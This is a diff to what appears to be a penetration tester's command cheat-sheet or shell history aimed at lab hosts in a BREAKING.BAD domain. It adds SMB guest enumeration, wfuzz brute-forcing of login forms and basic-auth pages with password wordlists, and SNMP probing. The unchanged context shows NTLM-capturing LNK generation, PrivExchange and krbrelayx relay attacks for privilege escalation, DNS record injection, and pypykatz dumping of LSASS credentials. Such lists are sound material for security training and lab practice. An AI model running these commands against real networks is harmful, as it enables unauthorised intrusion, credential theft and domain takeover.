@@ -61,10 +61,6 @@ cme smb 192.168.56.0/24 -u anonymous -p anonymous --sessions
 cme smb 192.168.56.0/24 -u anonymous -p anonymous --loggedon-users
 cme smb 192.168.56.0/24 --local-auth -u '' -p ''
 crackmapexec smb 192.168.56.0/24 -u '' -p '' --shares
-crackmapexec smb 192.168.56.0/24 -u anonymous -p anonymous --shares
-crackmapexec smb 192.168.56.0/24 -u anonymous -p anonymous --sessions
-crackmapexec smb 192.168.56.0/24 -u anonymous -p anonymous --loggedon-users
-crackmapexec smb 192.168.56.0/24 --local-auth -u '' -p ''
 privexchange.py -ah 192.168.56.1 -d BREAKING.BAD -u anonymous -p anonymous EXCHANGE.BREAKING.BAD
 neo4j console
 lnk-generate.py --host 192.168.56.1 --type ntlm --output '@SHUTDOWN-LNK.lnk'
@@ -84,15 +80,8 @@ onesixtyone 192.168.10.10 private
 onesixtyone 192.168.10.10 public
 onesixtyone 192.168.10.10 manager
 onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt 192.168.10.10
-snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.4.1.77.1.2.25
-snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.4.1.77.1.2.25
-snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.2.1.25.4.2.1.2
-snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.2.1.6.13.1.3
-snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.2.1.25.6.3.1.2
-snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.4.1.77.1.2.25
-snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.2.1.25.4.2.1.2
-snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.2.1.6.13.1.3
-snmpwalk -c public -v 1 192.168.10.10 1.3.6.1.2.1.25.6.3.1.2
+snmpwalk -c public -v 1 192.168.10.10
+snmpwalk -c public -v 2c 192.168.10.10
 cewl http://192.168.10.10/ > dictionnary.txt
 wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --plugins-detection aggressive
 wpscan --api-token APITOKEN --url http://192.168.10.10/ --no-banner --enumerate u
@@ -104,13 +93,14 @@ nmblookup -A 192.168.10.10
 enum4linux -n 192.168.10.10
 nmap --script 'smb-enum*' --script-args unsafe=1 -T5 192.168.10.10
 smbmap -H 192.168.10.10
+smbmap -u guest -H 192.168.10.10
 smbmap -H 192.168.10.10 -R
 smbmap -H 192.168.10.10 -R test
 smbclient -L '\\192.168.10.10'
 smbclient '\\192.168.56.101\SYSVOL' -U Administrator -W BREAKING.BAD
 smbclient '\\192.168.10.10\test'
 smbclient -N '\\192.168.10.10\test'
-smbclient -L -N '\\192.168.10.10'
+smbclient -N -L '\\192.168.10.10'
 nmap --script smb-enum-shares -p 139,445 -T4 -Pn 192.168.10.10
 rpcclient -U '' -N 192.168.10.10
 enum4linux -s 192.168.10.10
@@ -157,5 +147,7 @@ addspn.py -u 'BREAKING\serviceaccount' -p P4ssw0rd -t SV01 -s HTTP/SHUTDOWN.BREA
 dnstool.py -u 'BREAKING\serviceaccount' -p P4ssw0rd -r SHUTDOWN.BREAKING.BAD -d 192.168.56.1 --action add DC01.BREAKING.BAD
 privexchange.py -u serviceaccount -p P4ssw0rd -ah SHUTDOWN.BREAKING.BAD EXCHANGE.BREAKING.BAD -d BREAKING.BAD
 krbrelayx.py --krbpass P4ssw0rd --krbsalt BREAKING.BADSV01 -t ldap://dc01.breaking.bad --escalate-user serviceaccount
-wfuzz -c --hw 157 -L -z file,`fzf-wordlists` -z file,`fzf-wordlists` -X POST -d 'username=FUZZ&password=FUZ2Z' http://192.168.10.10/admin
+wfuzz -c --hw 157 -L -w `fzf-wordlists` -w `fzf-wordlists` -X POST -d 'username=FUZZ&password=FUZ2Z' http://192.168.10.10/admin
+wfuzz --hc 401 -c -v -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -w /usr/share/seclists/Passwords/darkweb2017-top100.txt --basic FUZZ:FUZ2Z http://192.168.10.10/secretpage
 pypykatz lsa minidump lsass.dmp
+enyx 1 public 192.168.10.10
